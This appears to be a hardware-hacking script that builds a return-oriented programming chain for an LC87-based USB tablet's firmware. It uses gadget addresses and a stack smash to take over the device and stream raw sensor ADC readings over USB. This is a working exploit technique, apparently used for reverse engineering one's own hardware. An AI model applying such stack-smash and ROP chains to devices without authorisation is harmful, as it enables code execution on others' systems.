#!/usr/bin/env python

# Values here for firmware version 1.16
# Version 1.13 has also been observed, with different offsets.

# This should be reading from a var we can try writing
word_addr = 0x3ae

# 12 MHz xtal
fosc = 12e6

# An okay place to return from the stack smash
mainloop_safe_spot = 0x818

# RAM addresses
ep1_buffer = 0x280
stack_base = 0x443
timer0_funcptr = 0x39d
rop_addr = 0x4f0
counter_addr = 0x38c
ep1flags = 0x1D
scanflags = 0x14
adc_result = 0x3a1
scan_postadc_callback = 0x39d

# LC87 registers
reg_pcon = 0xfe07
reg_ie = 0xfe08
reg_t0cnt = 0xfe10
reg_t1cnt = 0xfe18
reg_p3 = 0xfe4c         # Bit0 = test point TP5
reg_adcrc = 0xfe58
reg_adrlc = 0xfe5a
reg_adrhc = 0xfe5b
reg_btcr = 0xfe7f
reg_usbint = 0xfe82
reg_ep1cnt = 0xfe98
reg_wcon = 0xfeb0
reg_wmod = 0xfeb1
reg_wclkg = 0xfeb2
reg_wsnd = 0xfeb3
reg_wrcv = 0xfeb4
reg_wwai = 0xfeb5
reg_wcdly0 = 0xfeb6
reg_wcdly1 = 0xfeb7
reg_wsadr = 0xfeb8
reg_wradr = 0xfeba
reg_wpmr0 = 0xfebc
reg_wpmr1 = 0xfebd
reg_wpmr2 = 0xfebe
reg_wpllc = 0xfebf

# Code gadgets
ret = 0x244
infinite_loop = 0x1ac
ldw_spl_popw_r0 = 0x26f1
popw_spl_r0 = 0x7d6
popw_r0 = 0x2a2c
popw_r3 = 0xe1b
popw_r2_r3_r4 = 0x013cb
copy_codememR3_ramR2_countR4 = 0x2a30
stw_r3_ep0ack_ld04_popw_r2_r4_r5_r7_r6 = 0x23ec
st_r1_ep0ackstall_popw_r2 = 0x1e42
timer0_disable = 0x29ca
timer0_set_funcR3_timeoutR2 = 0x2983
adc_shutdown = 0xb89
memcpy_destR2_srcR3_countR4 = 0x29e0
feb0_loader = 0xb97
ep1sta_bit3_set = 0x25e1
wcon_set_D1h = 0xb82
incw_counter_popw_r2_r3_r4 = 0x13c8
r0_to_counter_popw_r2_r3 = 0xe12
pwm0_disable = 0x2f87
pwm1_disable = 0x2f11

# Lookup table for finding arbitrary bytes in code memory
# missing values: 52 D2
byte_gadgets = [
    0x0044, 0x0002, 0x00a1, 0x009f, 0x009e, 0x009d, 0x0128, 0x009c,
    0x009b, 0x009a, 0x0176, 0x0025, 0x0098, 0x00b2, 0x0097, 0x0096,
    0x00be, 0x0095, 0x00ca, 0x0094, 0x00d2, 0x0093, 0x00dc, 0x0092,
    0x00e4, 0x0091, 0x00ec, 0x0090, 0x00f4, 0x00f8, 0x008f, 0x0102,
    0x0000, 0x010a, 0x010e, 0x008d, 0x01dd, 0x008c, 0x02da, 0x0258,
    0x008b, 0x0259, 0x0015, 0x002d, 0x0045, 0x0089, 0x04fb, 0x025c,
    0x0088, 0x02df, 0x025d, 0x004c, 0x025e, 0x0086, 0x025f, 0x02e2,
    0x0085, 0x0261, 0x02e4, 0x0084, 0x02e5, 0x0263, 0x0083, 0x0220,
    0x03f1, 0x0082, 0x0173, 0x0160, 0x0081, 0x0267, 0x07b8, 0x0080,
    0x07eb, 0x02eb, 0x007f, 0x02ec, 0x026a, 0x007e, 0x0139, 0x01d8,
    0x026c, 0x007d, None,   0x026e, 0x007c, 0x026f, 0x0839, 0x007b,
    0x0589, 0x0271, 0x007a, 0x0272, 0x02f5, 0x0079, 0x1544, 0x0274,
    0x0078, 0x02f7, 0x0275, 0x0077, 0x0276, 0x02f9, 0x0277, 0x0076,
    0x01b6, 0x0279, 0x0075, 0x027a, 0x063e, 0x0074, 0x1be0, 0x027c,
    0x0073, 0x02ff, 0x0001, 0x0072, 0x0301, 0x027f, 0x0071, 0x0280,
    0x05ca, 0x0070, 0x1ad8, 0x0304, 0x006f, 0x0305, 0x0283, 0x006e,
    0x01df, 0x006d, 0x01be, 0x01b9, 0x006c, 0x01b7, 0x0014, 0x006b,
    0x01b8, 0x0187, 0x006a, 0x028a, 0x0069, 0x028b, 0x030e, 0x0068,
    0x030f, 0x0067, 0x01e5, 0x028e, 0x0066, 0x028f, 0x0065, 0x0175,
    0x0185, 0x0064, 0x0291, 0x0063, 0x0315, 0x0062, 0x0316, 0x0061,
    0x0186, 0x0060, 0x0295, 0x005f, 0x0296, 0x005e, 0x005d, 0x0298,
    0x005c, 0x005b, 0x0148, 0x005a, 0x0059, 0x0058, 0x014e, 0x0057,
    0x0056, 0x0054, 0x0053, 0x0051, 0x004e, 0x0034, 0x02a0, 0x0b2d,
    0x0242, 0x02a1, 0x02a2, 0x02a3, 0x0610, 0x02a4, 0x0327, 0x02a5,
    0x037d, 0x02a6, 0x1875, 0x02a7, 0x032a, 0x02a8, 0x032b, 0x02a9,
    0x07f0, 0x02aa, 0x02ab, 0x032e, 0x02ac, 0x0b64, 0x02ad, 0x0331,
    0x02ae, 0x02af, None,   0x02b0, 0x001c, 0x02b1, 0x02b2, 0x0335,
    0x02b3, 0x003c, 0x013c, 0x0337, 0x0338, 0x02b5, 0x02b6, 0x01aa,
    0x02b7, 0x02b8, 0x19f7, 0x033c, 0x02b9, 0x02ba, 0x0747, 0x0745,
    0x02bc, 0x02bd, 0x02be, 0x0740, 0x02bf, 0x0757, 0x0024, 0x0343,
    0x02c1, 0x02c2, 0x02c3, 0x0346, 0x02c4, 0x0347, 0x02c5, 0x0191,
    0x05f2, 0x0737, 0x0736, 0x075f, 0x06bb, 0x0784, 0x0177, 0x0003
]


def write_block(addr, bytes):
    print '%04x %s' % (addr, ' '.join(['%02x' % b for b in bytes]))

def write(addr, bytes):
    while bytes:
        write_block(addr, bytes[:0x10])
        addr += 0x10
        bytes = bytes[0x10:]


class Reloc:
    def __init__(self, offset=0, shift=0):
        self.offset = offset
        self.shift = shift

    def link(self, base_addr, index):
        #print "link %d %d %04x %04x" % (self.offset, self.shift, base_addr, index)
        return 0xff & ((self.offset + base_addr + index) >> self.shift)


class Ropper:
    def __init__(self):
        self.bytes = []

    def link(self, base_addr):
        result = []
        for i in range(len(self.bytes)):
            b = self.bytes[i]
            if isinstance(b, Reloc):
                result.append(b.link(base_addr, i))
            else:
                result.append(int(b))
        return result

    def le16(self, word):
        self.bytes = [word & 0xFF, word >> 8] + self.bytes

    def nop(self, count = 1):
        while count > 0:
            self.le16(ret)
            count -= 1

    def rel16(self, offset = 0):
        self.bytes = [Reloc(offset), Reloc(offset-1, shift=8)] + self.bytes

    def jmp(self, sp):
        self.le16(popw_spl_r0)
        self.le16(sp + 2)

    def set_r0(self, r0):
        self.le16(popw_r0)
        self.le16(r0)

    def set_r2_r3_r4(self, r2, r3, r4):
        self.le16(popw_r2_r3_r4)
        self.le16(r2)
        self.le16(r3)
        self.le16(r4)

    def memcpy(self, dest, src, count):
        self.set_r2_r3_r4(dest, src, count)
        self.le16(memcpy_destR2_srcR3_countR4)

    def copy_from_codemem(self, dest, src, count):
        self.set_r2_r3_r4(dest, src, count)
        self.le16(copy_codememR3_ramR2_countR4)

    def memcpy_indirect_src(self, dest, src_ptr, count):
        # memcpy a new src into the memcpy below
        self.le16(popw_r2_r3_r4)
        self.rel16(-2*6)
        self.le16(src_ptr)
        self.le16(2)
        self.le16(memcpy_destR2_srcR3_countR4)

        self.le16(popw_r2_r3_r4)
        self.le16(dest)
        self.le16(0)  # rel target
        self.le16(count)
        self.le16(memcpy_destR2_srcR3_countR4)

    def delay(self, millisec):
        # memcpy is pretty slow, try to do a nop with it
        v = int(round(102 * millisec))
        while v > 0:
            q = min(v, 0x3000)
            self.memcpy(0xc000, 0xc000, q)
            v -= q

    def poke(self, dest, byte):
        self.copy_from_codemem(dest, byte_gadgets[byte], 1)

    def pokew(self, dest, word):
        self.poke(dest, word & 0xff)
        self.poke(dest+1, word >> 8)

    def get_stuck(self):
        self.le16(infinite_loop)

    def debug_out(self, level):
        self.poke(reg_p3, level)

    def debug_pulse(self, count = 1):
        for i in range(count):
            self.debug_out(0)
            self.debug_out(1)

    def ep1_send(self, count):
        self.poke(reg_ep1cnt, count)
        self.le16(ep1sta_bit3_set)

    def ep1_poke(self, bytes):
        for i in range(len(bytes)):
            self.poke(ep1_buffer + i, bytes[i])
        self.ep1_send(len(bytes))

    def ep1_mouse_packet(self):
        self.poke(ep1_buffer + 0, 1)
        self.ep1_send(5)

    def ep1_tablet_packet(self):
        self.poke(ep1_buffer + 0, 2)
        self.ep1_send(9)

    def set_wclk_freq(self, hz):
        n = int(round((fosc / 2.0 / hz) - 1))
        assert n >= 0
        assert n <= 0xff
        self.poke(reg_wclkg, n)

    def set_counter(self, value):
        self.set_r0(value)
        self.le16(r0_to_counter_popw_r2_r3)
        self.le16(0)
        self.le16(0)

    def inc_counter(self):
        self.le16(incw_counter_popw_r2_r3_r4)
        self.le16(0)
        self.le16(0)
        self.le16(0)

    def irq_global_disable(self):       self.poke(reg_ie, 0)
    def irq_global_restore(self):       self.poke(reg_ie, 0x8C)
    def irq_disable_timer0(self):       self.poke(reg_t0cnt, 0)
    def irq_disable_timer1(self):       self.poke(reg_t1cnt, 0)
    def irq_disable_adc(self):          self.poke(reg_adcrc, 0)
    def irq_disable_basetimer(self):    self.poke(reg_btcr, 0)
    def irq_disable_usb(self):          self.poke(reg_usbint, 0)

    def irq_disable_pwm(self):
        r.le16(pwm0_disable)
        r.le16(pwm1_disable)

    def irq_disable_tablet(self):
        self.irq_global_disable()
        self.irq_disable_timer0()
        self.irq_disable_timer1()
        self.irq_disable_adc()
        self.irq_global_restore()

    def irq_wait(self):
        self.poke(reg_pcon, 1)

    def adc_start(self):
        self.poke(reg_adcrc, 0x04)


def make_slide(entry):
    r = Ropper()
    r.nop(6)
    r.jmp(entry)
    assert len(r.bytes) == 0x10
    return r


def make_looper(base_addr, setup_code, body_factory):
    # Executing code destroys it, we have to make copies.
    # This is slow, so we give the loop body an option to do it incrementally.

    def trampoline(dest, src, code_size, copy_size=None):
        r = Ropper()
        r.memcpy(dest, src, copy_size or code_size)
        r.jmp(dest + code_size - 1)
        return r.bytes

    default_margin = 0x50
    def precopy_placeholder(r, n_bytes):
        r.memcpy(0,0,0)

    trampoline_size = len(trampoline(0,0,0))
    body_size = len(body_factory(precopy_placeholder).bytes)

    # We'll need to include room for 2 extra trampolines with the body,
    # the one used to restore the setup trampoline, and the setup trampoline itself.
    augmented_body_size = 2 * trampoline_size + body_size

    # Now we can lay out the address space. Copy of the loop body overwrites the setup code.
    addr_augbody_orig = base_addr
    addr_setup_trampoline = base_addr + augmented_body_size
    addr_setup_code = addr_setup_trampoline + trampoline_size
    addr_augbody_copy = addr_setup_code
    addr_body_copy = addr_augbody_copy + 2 * trampoline_size

    # Generate the actual body code, and keep track of how much precopying we've done.
    # At each precopy opportunity, we can overwrite anything >= what's already executed.
    precopy_len = [0]
    def precopy_fn(r, n_bytes, precopy_len=precopy_len):
        assert n_bytes > 0
        next_precopy_len = precopy_len[0] + n_bytes
        assert next_precopy_len < len(r.bytes)
        offset = augmented_body_size - next_precopy_len
        r.memcpy(addr_augbody_copy + offset, addr_augbody_orig + offset, n_bytes)
        precopy_len[0] = next_precopy_len
    body_code = body_factory(precopy_fn)

    restore_trampoline = trampoline(addr_setup_trampoline, addr_augbody_orig, trampoline_size)

    first_setup_trampoline = trampoline(addr_augbody_copy, addr_augbody_orig, augmented_body_size)
    repeat_setup_trampoline = trampoline(addr_augbody_copy, addr_augbody_orig,
                                        code_size=augmented_body_size,
                                        copy_size=augmented_body_size - precopy_len[0])

    augmented_body = repeat_setup_trampoline + restore_trampoline + body_code.link(addr_body_copy)
    assert len(augmented_body) == augmented_body_size

    return augmented_body + first_setup_trampoline + setup_code.link(addr_setup_code)


def feb0_loader_test(r):
    # Code fragment intended for factory test maybe?
    write(0x100, [  #   B0h  -> FEB0h_WCON
        0x00,       # [100h] -> FEB1h_WMOD
        0x07,       # [101h] -> FEB2h_WCLKG
        0x4a,       # [102h] -> FEB3h_WSND
        0xaf,       # [103h] -> FEB4h_WRCV
        0x7f,       # [104h] -> FEB5h_WWAI
        0x32,       # [105h] -> FEB6h_WCDLY0
        0x70,       # [106h] -> FEB8h_WSADRL
        0x06,       # [107h] -> FEB7h_WCDLY1
        0x02,       # [108h] -> FEB9h_WSADRH
        0x70,       # [109h] -> FEBAh_WRADRL
        0x02,       # [10ah] -> FEBBh_WRADRH
        0xfc,       # [10bh] -> FEBCh_WPMR0
        0x03,       # [10ch] -> FEBDh_WPMR1
        0xf1,       # [10dh] -> FEBEh_WPMR2
        0x00,       # [10eh] -> FEBFh_WPLLC
    ])              #   F1h  -> FEB0h_WCON
    r.le16(feb0_loader)


def setup_func():
    r = Ropper()

    # Global disable while we're setting up
    r.irq_global_disable()

    # Turn off all IRQs except vector_23 (used by FEB0h peripheral)
    # We keep using part of that interrupt handler to trigger the ADC
    # and store its result.

    r.irq_disable_timer0()
    r.irq_disable_timer1()
    r.irq_disable_adc()
    r.irq_disable_pwm()
    r.irq_disable_usb()
    r.irq_disable_basetimer()

    # Stub out the callback that is usually invoked after storing the ADC result
    r.poke(ep1flags, 1)         # One-shot flag, triggers ADC on next FEB0h interrupt. Retrigger in the FEB0h ADC callback.
    r.poke(scanflags, 0)        # Make sure we don't disable scanning in the FEB0h ADC callback.
    r.pokew(scan_postadc_callback, ret)

    # Set up FEB0h peripheral
    r.poke(reg_wcon, 0xb0)              # Enabled, wait enabled, charge pump on
    r.set_wclk_freq(125000)             # Carrier frequency
    r.poke(reg_wsnd, 8)                 # Transmit length (fraction of a bit)
    r.poke(reg_wrcv, 127)               # Receive length (max)
    r.poke(reg_wwai, 127)               # Repeat delay / ADC conversion time (max)
    r.pokew(reg_wsadr, 0x158)           # Where to transmit (X12)
    r.memcpy(reg_wradr, reg_wsadr, 2)   # Receive at the same spot

    # Pre-load packet header
    r.poke(ep1_buffer + 0, 2)
    r.poke(reg_ep1cnt, 9)

    # Initiate scanning & repeat
    r.poke(reg_wcon, 0xf1)

    r.irq_global_restore()

    return r

def loop_func(precopy):
    r = Ropper()

    # Send USB packet
    r.le16(ep1sta_bit3_set)

    for bit in range(4):

        # Store the previous result
        r.memcpy(ep1_buffer + 1 + bit*2, reg_adrlc, 2)

        # Wait for the FEB0h interrupt, indicating RX completion.
        # The ISR will start the ADC for us.
        r.irq_wait()

        r.debug_out(bit & 1)

        # Spread out the loop overhead
        if bit == 0: precopy(r, 0x18)
        if bit == 1: precopy(r, 0x20)
        if bit == 2: precopy(r, 0x30)

    return r


def write_loop(base_addr, setup_code, body_factory):
    # Make a code fragment that runs repeatedly
    looper = make_looper(base_addr, setup_code, body_factory)
    entry = base_addr + len(looper) - 1
    write(base_addr, looper)
    write(stack_base, make_slide(entry).bytes)

if __name__ == '__main__':
    write_loop(rop_addr, setup_func(), loop_func)
